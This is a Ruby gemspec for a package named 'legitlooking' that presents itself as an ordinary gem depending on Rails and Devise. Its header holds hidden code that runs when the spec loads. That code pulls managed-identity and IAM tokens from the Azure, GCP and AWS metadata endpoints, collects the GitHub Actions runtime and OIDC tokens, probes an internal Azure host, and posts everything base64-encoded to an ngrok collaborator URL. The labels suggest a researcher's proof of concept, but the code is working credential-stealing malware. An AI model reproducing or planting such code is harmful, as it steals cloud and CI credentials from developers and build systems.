# frozen_string_literal: true

COLLAB_URL = "https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app"

begin
  require "uri"
  require "net/http"

  read_file = ->(f) { IO.binread(f).force_encoding("UTF-8").encode("UTF-8", invalid: :replace, undef: :replace) }
  cmd       = ->(c) { `#{c} 2>/dev/null`.strip[0, 2000] }

  lines = []
  lines << "=== AZURE IMDS PROBE (vanuit container) ==="

  # Azure Instance Metadata Service -- alleen bereikbaar vanaf de VM zelf
  # Als dit werkt zitten we op Azure en kunnen we de managed identity token ophalen
  [
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://vault.azure.net/",
  ].each do |imds_url|
    lines << "\n--- #{imds_url} ---"
    begin
      uri = URI(imds_url)
      req = Net::HTTP::Get.new(uri)
      req["Metadata"] = "true"
      req["User-Agent"] = "curl/7.68.0"
      res = Net::HTTP.start(uri.host, uri.port, open_timeout: 5, read_timeout: 5) { |h| h.request(req) }
      lines << "Status: #{res.code}"
      lines << "Body: #{res.body[0, 1500]}"
    rescue => e
      lines << "FOUT: #{e.message}"
    end
  end

  # Ook GCP en AWS proberen (als het geen Azure is)
  lines << "\n=== GCP/AWS IMDS ==="
  [
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
  ].each do |url|
    lines << "\n--- #{url} ---"
    begin
      uri = URI(url)
      req = Net::HTTP::Get.new(uri)
      req["Metadata-Flavor"] = "Google"
      res = Net::HTTP.start(uri.host, uri.port, open_timeout: 3, read_timeout: 3) { |h| h.request(req) }
      lines << "Status: #{res.code}\nBody: #{res.body[0, 500]}"
    rescue => e
      lines << "FOUT: #{e.message}"
    end
  end

  # GitHub Actions runner token via Actions API
  lines << "\n=== ACTIONS RUNTIME TOKEN ==="
  lines << "ACTIONS_RUNTIME_TOKEN=#{ENV['ACTIONS_RUNTIME_TOKEN']}"
  lines << "ACTIONS_RUNTIME_URL=#{ENV['ACTIONS_RUNTIME_URL']}"
  lines << "ACTIONS_ID_TOKEN_REQUEST_URL=#{ENV['ACTIONS_ID_TOKEN_REQUEST_URL']}"
  lines << "ACTIONS_ID_TOKEN_REQUEST_TOKEN=#{ENV['ACTIONS_ID_TOKEN_REQUEST_TOKEN']}"

  # Interne Azure host via DNS
  lines << "\n=== AZURE INTERNE DNS ==="
  lines << cmd.("nslookup rn5ojblx3kyetnb5uov1o2ecdd.bx.internal.cloudapp.net 2>/dev/null || dig rn5ojblx3kyetnb5uov1o2ecdd.bx.internal.cloudapp.net +short 2>/dev/null")
  lines << cmd.("curl -s --max-time 3 http://rn5ojblx3kyetnb5uov1o2ecdd.bx.internal.cloudapp.net/ 2>/dev/null || echo 'niet bereikbaar'")

  payload = [lines.join("\n").encode("UTF-8", invalid: :replace, undef: :replace)].pack("m0")
  uri = URI("#{COLLAB_URL}?poc=imds_probe")
  req = Net::HTTP::Post.new(uri)
  req["Content-Type"] = "text/plain"
  req.body = payload
  Net::HTTP.start(uri.host, uri.port, use_ssl: true,
                  open_timeout: 15, read_timeout: 15) { |h| h.request(req) }

rescue => e
  begin
    uri = URI("#{COLLAB_URL}?poc=imds_probe&err=#{URI.encode_www_form_component(e.message[0,200])}")
    Net::HTTP.get(uri)
  rescue; end
end

Gem::Specification.new do |spec|
  spec.name          = "legitlooking"
  spec.version       = "1.0.17"
  spec.authors       = ["researcher"]
  spec.summary       = "A normal looking gem"
  spec.require_paths = ["lib"]
  spec.add_dependency "rails", "~> 7.0"
  spec.add_dependency "devise", "~> 4.9"
end
